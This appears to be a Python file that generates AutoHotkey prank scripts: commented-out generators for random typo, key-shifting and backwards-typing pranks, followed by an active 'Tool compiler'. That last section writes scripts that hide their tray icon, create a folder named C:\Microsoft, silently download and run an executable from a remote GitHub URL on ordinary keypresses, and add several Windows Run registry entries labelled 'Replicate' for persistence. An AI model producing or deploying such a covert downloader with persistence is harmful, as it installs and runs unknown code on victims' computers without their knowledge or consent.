# Fat Fingering Compiler
"""
neighbors = {
    'q': ['w', 'a'],
    'w': ['q', 'a', 's', 'e'],
    'e': ['w', 's', 'd', 'r'],
    'r': ['e', 'd', 'f', 't'],
    't': ['r', 'f', 'g', 'y'],
    'y': ['t', 'g', 'h', 'u'],
    'u': ['y', 'h', 'j', 'i'],
    'i': ['u', 'j', 'k', 'o'],
    'o': ['i', 'k', 'l', 'p'],
    'p': ['o', 'l'],

    'a': ['q', 'w', 's', 'z'],
    's': ['a', 'w', 'e', 'd', 'x', 'z'],
    'd': ['s', 'e', 'r', 'f', 'c', 'x'],
    'f': ['d', 'r', 't', 'g', 'v', 'c'],
    'g': ['f', 't', 'y', 'h', 'b', 'v'],
    'h': ['g', 'y', 'u', 'j', 'n', 'b'],
    'j': ['h', 'u', 'i', 'k', 'n', 'm'],
    'k': ['j', 'i', 'o', 'l', 'm'],
    'l': ['k', 'o', 'p'],

    'z': ['a', 's', 'x'],
    'x': ['z', 's', 'd', 'c'],
    'c': ['x', 'd', 'f', 'v'],
    'v': ['c', 'f', 'g', 'b'],
    'b': ['v', 'g', 'h', 'n'],
    'n': ['b', 'h', 'j', 'm'],
    'm': ['n', 'j', 'k']
}

result = '''#SingleInstance Force

global odds1 := 1
global odds2 := 10

konami(char) {
	static current := 0
	if (char = "Up" && current = 0) {
		current := 1
	} else if (char = "Up" && current = 1) {
		current := 2
	} else if (char = "Down" && current = 2) {
		current := 3
	} else if (char = "Down" && current = 3) {
		current := 4
	} else if (char = "Left" && current = 4) {
		current := 5
	} else if (char = "Right" && current = 5) {
		current := 6
	} else if (char = "Left" && current = 6) {
		current := 7
	} else if (char = "Right" && current = 7) {
		current := 8
	} else if (char = "b" && current = 8) {
		current := 9
	} else if (char = "a" && current = 9) {
		ExitApp()
	} else {
		current := 0
	}
}

'''

for key in neighbors:
    adjacent = neighbors[key]
    result += "$" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
    result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
    first = True
    for i in range(len(adjacent)):
        if not first:
            result += ' else '
        else:
            first = False
        result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
    result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
    result += '\n\tkonami("' + key + '")'
    result += '\n}\n'

    result += "$+" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
    result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
    first = True
    for i in range(len(adjacent)):
        if not first:
            result += ' else '
        else:
            first = False
        result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
    result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
    result += '\n\tkonami("' + key + '")'
    result += '\n}\n'

result += '''$Up::{
	Send "{Up}"
	konami("Up")
}
$Down::{
	Send "{Down}"
	konami("Down")
}
$Left::{
	Send "{Left}"
	konami("Left")
}
$Right::{
	Send "{Right}"
	konami("Right")
}
'''

with open("output.txt", "w") as file:
    file.write(result + "^Esc::ExitApp\n")
"""




# Shift Keyboard Right One Compiler
"""
letters = [
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
    'z', 'x', 'c', 'v', 'b', 'n', 'm',
]
letters2 = [
    'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'q',
    's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'a',
    'x', 'c', 'v', 'b', 'n', 'm', 'z',
]

result = '''#SingleInstance Force

konami(char) {
	static current := 0
	if (char = "Up" && current = 0) {
		current := 1
	} else if (char = "Up" && current = 1) {
		current := 2
	} else if (char = "Down" && current = 2) {
		current := 3
	} else if (char = "Down" && current = 3) {
		current := 4
	} else if (char = "Left" && current = 4) {
		current := 5
	} else if (char = "Right" && current = 5) {
		current := 6
	} else if (char = "Left" && current = 6) {
		current := 7
	} else if (char = "Right" && current = 7) {
		current := 8
	} else if (char = "b" && current = 8) {
		current := 9
	} else if (char = "a" && current = 9) {
		ExitApp()
	} else {
		current := 0
	}
}

'''

for i in range(len(letters)):
    result += '$' + letters[i] + '''::{
    Send "''' + letters2[i] + '''"
    konami("''' + letters[i] + '''")
}
'''

with open("output.txt", "w") as file:
    file.write(result + "^Esc::ExitApp\n")
"""




# Type Backwards Compiler
"""
letters = [
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
    'z', 'x', 'c', 'v', 'b', 'n', 'm',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    '-', '=', '[', ']', '\\', ';', "'", ',', '.', '/',
]

result = '''#SingleInstance Force

konami(char) {
	static current := 0
	if (char = "Up" && current = 0) {
		current := 1
	} else if (char = "Up" && current = 1) {
		current := 2
	} else if (char = "Down" && current = 2) {
		current := 3
	} else if (char = "Down" && current = 3) {
		current := 4
	} else if (char = "Left" && current = 4) {
		current := 5
	} else if (char = "Right" && current = 5) {
		current := 6
	} else if (char = "Left" && current = 6) {
		current := 7
	} else if (char = "Right" && current = 7) {
		current := 8
	} else if (char = "b" && current = 8) {
		current := 9
	} else if (char = "a" && current = 9) {
		ExitApp()
	} else {
		current := 0
	}
}

'''

for i in range(len(letters)):
    result += '$' + letters[i] + '''::{
    Send "''' + letters[i] + '''{Left}"
    konami("''' + letters[i] + '''")
}
'''
    result += '$+' + letters[i] + '''::{
    Send "+''' + letters[i] + '''{Left}"
    konami("''' + letters[i] + '''")
}
'''

result += '''Space::{
    Send "{Space}"
    konami("Space")
}
Up::{
    Send "{Down}"
    konami("Up")
}
Down::{
    Send "{Up}"
    konami("Down")
}
Left::{
    Send "{Right}"
    konami("Left")
}
Right::{
    Send "{Left}"
    konami("Right")
}
'''

with open("output.txt", "w") as file:
    file.write(result + "^Esc::ExitApp\n")
"""




# Tool compiler

letters = [
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
    'z', 'x', 'c', 'v', 'b', 'n', 'm',
]
others = [
    'LButton', 'RButton', 'Delete', 'Backspace', 'Space',
]

for letter in letters:
    result = '''#SingleInstance Ignore
#NoTrayIcon

$'''
    result += letter + r'''::{
    path := "C:\Microsoft"
    Send "''' + letter + r'''"

    static lastRun := 0
    delay := 2000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
'''

    with open("../Public-AHK/" + letter + ".ahk", "w") as file:
        file.write(result)


for other in others:
    result = '''#SingleInstance Ignore
#NoTrayIcon

Run "C:\Microsoft\\run.exe"

$'''
    result += other + r'''::{
    path := "C:\Microsoft"
    Send "{''' + other + r'''}"
    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
    RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
    RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
    RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"

    static lastRun := 0
    delay := 1000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
'''

    with open("../Public-AHK/" + other + ".ahk", "w") as file:
        file.write(result)
